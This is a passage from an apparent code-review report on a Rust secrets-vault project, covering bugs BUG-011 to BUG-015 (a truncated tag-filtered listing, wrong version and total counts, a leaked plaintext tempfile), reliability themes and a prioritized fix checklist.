**Fix:** Add `namespace_label` (materialized from the namespace label) to the `put_secret` INSERT, mirroring `description`/`tags_text`; or change the trigger to `COALESCE(NULLIF(new.namespace_label,''), subquery)` and repair existing rows.

### BUG-011 — `list_secrets` applies SQL `LIMIT` before the Rust-side `tag_match` filter, truncating results
**Severity:** Medium **File:** `crates/merkle-adapter-sqlite/src/secrets.rs:247-309`; handler `handlers/secrets.rs:226-244`
**Defect:** When both `limit` and `tag_match` are set, the SQL `LIMIT` (247-250) caps the fetch first, then the Rust tag filter (297-309) discards non-matching rows from that capped set via `continue`. Matching rows beyond the LIMIT boundary are never fetched. The non-ranked handler always sets `limit: Some(params.limit)` (default 50) and sets `tag_match` when a `tags` param is supplied, with `next_cursor: None` and a bare `Vec<Secret>` return — no truncation signal.
**Scenario:** Namespace has 100 secrets, 20 tagged `env:prod`. `list(limit:50, tag_match:[env:prod])` fetches the first 50 by `created_at ASC`; if only 3 of those carry the tag, the caller gets 3 and concludes there are only 3 matches, silently missing 17.
**Fix:** Push the tag filter into SQL (`json_each(tags_json)` `EXISTS`) so `LIMIT` applies after matching; or drop the SQL `LIMIT` when `tag_match` is set and truncate after the Rust filter.

### BUG-012 — `delete_secret` handler always reports `versions_removed: 1`
**Severity:** Medium **File:** `crates/merkle-adapter-companion-socket/src/handlers/secrets.rs:443-447`
**Defect:** On success the handler returns `DeleteSecretResponse { deleted: true, versions_removed: 1 }`. `DeleteSecretOutput` (delete_secret.rs:25-28) carries only `handle` — the real count is never captured. The command hard-deletes the secret with all its versions (`storage.delete_secret(&secret.id)`, delete_secret.rs:78).
**Scenario:** A secret rotated 5 times (6 versions) is deleted; CLI/MCP report `versions_removed: 1`. Accounting/scripts that rely on the count are wrong whenever `versions > 1`.
**Fix:** Return the actual deleted-version count from `DeleteSecretCommand` and use it in the response.

### BUG-013 — `rotate_secret` reports `versions_retained = new_version_no` (wrong semantics)
**Severity:** Medium **File:** `crates/merkle-adapter-companion-socket/src/handlers/secrets.rs:527-534`
**Defect:** `versions_retained` is set to `output.new_version_no` (rotate_secret.rs:103, = `current_max + 1`), conflating the version number with the retained count. Rotation applies `RetentionPolicy::new(3)` (rotate_secret.rs:116-120), so the true retained count is bounded by `retain_count`, not `N+1`.
**Scenario:** 9th rotation → `new_version_no = 10`; response says `versions_retained: 10` while only ~3 versions actually survive. The `vault.rotate` response misleads about retention.
**Fix:** Add a real `versions_retained` to `RotateSecretOutput` reflecting survivors after applying the namespace `retain_count`, and use it in the response.

### BUG-014 — `list_secrets` `total` equals page size; understated when truncated by `limit`
**Severity:** Medium **File:** `crates/merkle-adapter-companion-socket/src/handlers/secrets.rs:250`
**Defect:** In the non-ranked path, `total = u32::try_from(items.len())` where `items` is already capped by the SQL `LIMIT`; `next_cursor` and `has_more` are `None`. When the real total exceeds `limit`, `total` reports the page size, with no pagination signal.
**Scenario:** Namespace has 200 secrets, caller sends `limit=50` → 50 items, `total=50`. Caller concludes the namespace has 50 and stops; 150 are never fetched.
**Fix:** Issue a separate `count_secrets` query before the limit, return the real total, and set `has_more = real_total > offset + items.len()`.

---

## Low

### BUG-015 — `write_tempfile` leaks the plaintext tempfile when the audit write fails
**Severity:** Low **File:** `crates/merkle-application/src/commands/write_tempfile.rs:83-117`
**Defect:** Plaintext is written at line 83 via `tokio::fs::write`. If `append_audit_entry` fails at 116-117, `?` propagates with no cleanup of `tmp_path`; the file persists and its `opaque_token` is never returned, so it cannot be revoked via the normal API (the `_tempfile` binding at line 94 is immediately dropped, never registered with the reaper).
**Scenario:** Transient SQLite failure during `write_tempfile` leaves `$TMPDIR/merkle_<token>.tmp` on disk with no revocation path.
**Fix:** Wrap write+chmod in a cleanup guard (e.g. `scopeguard`) that unlinks the file on early return, defused only after the audit write succeeds; register the tempfile with the reaper before the audit write.
**NEEDS MANUAL CONFIRMATION** for the reaper-registration timing — the plaintext-exposure and 0644-window aspects are security-scoped and excluded here.

---

## Reliability themes

1. **Non-atomic multi-row writes.** `put_secret` (BUG-001) and the audit-log/storage split (BUG-003) both advance one part of an aggregate before another part is durably written, opening read-skew and crash-orphan windows. `put_secret`/`rotate_secret` already hold locks/transactions correctly — the unsafe sites are inconsistent regressions from the safe pattern.
2. **Side effect created before its commit point.** `write_fifo` (BUG-004) and `write_tempfile` (BUG-015) create OS resources (FIFO, blocked thread, plaintext file) before the audit write that gates the returned handle; on failure the resource leaks with no revocation path. Correct order is "commit, then create."
3. **Parameter plumbing dropped at adapter boundaries.** A pervasive pattern: a field is declared in the input DTO/query, parsed, then hardcoded to `None`/empty when the next-layer request/command is built (BUG-006 MCP put/list, BUG-007 category, BUG-008 audit op/outcome). The features look implemented end-to-end but silently no-op.
4. **Response count/total fields fabricated, not measured.** `versions_removed` (BUG-012), `versions_retained` (BUG-013), and `total` (BUG-014) are placeholders or the wrong quantity because the command output never carries the real number. Callers that paginate or account on these get wrong results.
5. **Two derivations of one secret value drift.** `init` vs `unseal` HMAC-key derivation (BUG-005) diverge because the unseal side is a placeholder; the integrity verifier consumes only one. A single source-of-truth derivation is needed.
6. **Limit-before-filter and missing pagination signals.** BUG-011 and BUG-014 both stem from `list_secrets` filtering/counting after a SQL `LIMIT` and returning a bare `Vec` with no `has_more`/cursor, so truncation is undetectable.

---

## Prioritized fix checklist (by impact)

1. **BUG-001** — Wrap `put_secret` versions in the same transaction as the `secrets` row (`&mut *tx` + single `commit`). _Prevents unreadable/orphaned secrets._
2. **BUG-005** — Unify the audit HMAC-key derivation between `init` and `unseal` (decrypt the master-wrapped VRK; same domain string). _Restores chain verification on every vault._
3. **BUG-003** — Hold the audit-log lock across both storage writes; add a monotonic guard to `update_pinned_head` and drop the redundant second call. _Prevents audit-chain gaps/duplicates._
4. **BUG-006** — Wire MCP `vault.put`/`vault.list` input fields (`tags`, `sensitivity`, `expires_before`) into the requests. _Stops silent wrong-metadata storage and ignored filters._
5. **BUG-002** — Revert identity to `Sealed` on the Window-4 keychain failure (or fold HMAC derivation into Window 3). _Removes the permanent split-state lockout._
6. **BUG-004** — Create the FIFO + writer only after the audit write commits; reclaim on error. _Stops thread-pool/FIFO exhaustion._
7. **BUG-007 / BUG-008** — Forward `category` and `op`/`outcome` filters to the domain command/query. _Makes documented filters work._
8. **BUG-011 / BUG-014** — Push the tag filter into SQL and return a real `total` + `has_more`. _Fixes truncated/understated listings._
9. **BUG-010** — Populate `namespace_label` on insert (or fix the trigger COALESCE). _Restores search ranking/highlights._
10. **BUG-012 / BUG-013** — Return real `versions_removed` / `versions_retained` from the commands. _Correct response counts._
11. **BUG-009** — Persist and validate `UseToken` on the materialization path. _Enforces the single-use/TTL invariant._
12. **BUG-015** — Add a cleanup guard around the tempfile write. _Stops leaked tempfiles on audit failure._